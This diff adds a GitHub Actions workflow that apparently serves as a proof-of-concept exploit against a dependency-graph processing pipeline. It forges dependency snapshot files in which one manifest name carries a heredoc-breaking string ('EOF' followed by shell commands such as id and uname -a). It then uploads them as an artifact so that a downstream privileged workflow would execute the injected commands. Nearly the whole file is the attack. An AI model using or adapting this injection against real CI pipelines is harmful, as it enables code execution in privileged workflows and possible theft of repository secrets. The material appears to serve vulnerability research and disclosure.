@@ -1,0 +1,52 @@
+name: PR Workflow
+on: pull_request
+permissions:
+  contents: read
+jobs:
+  forged:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged dependency graph artifact
+        env:
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p dependency-graph-reports
+          python3 - <<'PY'
+          import json, os
+          base, head, n = os.environ["BASE_SHA"], os.environ["HEAD_SHA"], os.environ["PR_NUM"]
+          evil = (
+              "x\n"
+              "EOF\n"
+              "id\n"
+              "uname -a\n"
+              "echo GAB_RCE_PROOF\n"
+              "exit 0\n"
+              "#"
+          )
+          def snap(sha, ref, manifests):
+              return {"version": 0, "sha": sha, "ref": ref,
+                      "job": {"correlator": "gab-rce-poc", "id": "poc"},
+                      "detector": {"name": "gab-rce-detector", "version": "1.0.0", "url": "https://example.com"},
+                      "scanned": "2026-10-30T00:00:00Z", "manifests": manifests}
+          def man(name, purls, loc):
+              return {"name": name, "file": {"source_location": loc},
+                      "resolved": {p: {"package_url": p, "relationship": "direct",
+                                       "scope": "runtime", "dependencies": []} for p in purls}}
+          base_man = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle")}
+          head_man = {
+              "build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle"),
+              evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"], evil),
+          }
+          json.dump(snap(base, "refs/heads/poc-base", base_man), open("dependency-graph-reports/poc-base.json", "w"))
+          json.dump(snap(head, "refs/heads/poc-forged", head_man), open("dependency-graph-reports/poc-head.json", "w"))
+          PY
+          echo keep > keep.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc.json
+          path: |
+            dependency-graph-reports/poc-base.json
+            dependency-graph-reports/poc-head.json
+            keep.txt
